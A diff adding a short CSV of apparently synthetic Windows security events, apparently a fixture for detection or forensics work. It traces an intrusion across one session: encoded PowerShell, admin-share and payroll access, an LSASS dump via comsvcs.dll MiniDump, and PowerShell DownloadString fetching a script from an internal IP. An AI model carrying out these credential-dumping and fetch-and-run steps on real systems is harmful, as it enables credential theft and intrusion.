@@ -1,0 +1,14 @@
+timestamp,event_id,source,host,user,description
+2025-09-18 10:01:12,4624,Windows Security,WS-011,alice,Network logon (Type=3) from Src=10.0.0.5
+2025-09-18 10:03:09,4672,Windows Security,WS-011,alice,Special Privileges assigned: SeDebugPrivilege
+2025-09-18 10:07:44,4688,Windows Security,WS-011,alice,Process creation: powershell.exe -enc <base64>
+2025-09-18 10:08:02,4769,Security,SRV-DC1,alice,Kerberos service ticket issued for SPN=cifs/SRV-FS1
+2025-09-18 10:09:11,5145,Windows Security,SRV-FS1,alice,Detailed file share access: \\\\SRV-FS1\\C$
+2025-09-18 10:09:33,4663,Security,SRV-FS1,alice,Object access attempted on \\\\SRV-FS1\\Finance\\payroll.xlsx
+2025-09-18 10:10:02,4688,Windows Security,WS-011,alice,Process creation: rundll32.exe with comsvcs.dll MiniDump
+2025-09-18 10:10:18,4799,Windows Security,WS-011,alice,A security-enabled local group membership was enumerated
+2025-09-18 10:12:30,4672,Windows Security,WS-011,alice,Special Privileges assigned: SeBackupPrivilege
+2025-09-18 10:13:12,4688,Windows Security,WS-011,alice,Process creation: powershell.exe DownloadString http://10.0.0.99/x.ps1
+2025-09-18 10:15:44,4625,Windows Security,SRV-DC1,alice,Logon failure - bad password (count=3)
+2025-09-18 10:16:01,4624,Windows Security,SRV-DC1,alice,Successful logon (Type=10 RemoteInteractive)
+2025-09-18 10:18:25,4674,Windows Security,WS-011,alice,An operation was attempted on a privileged object (LSASS)
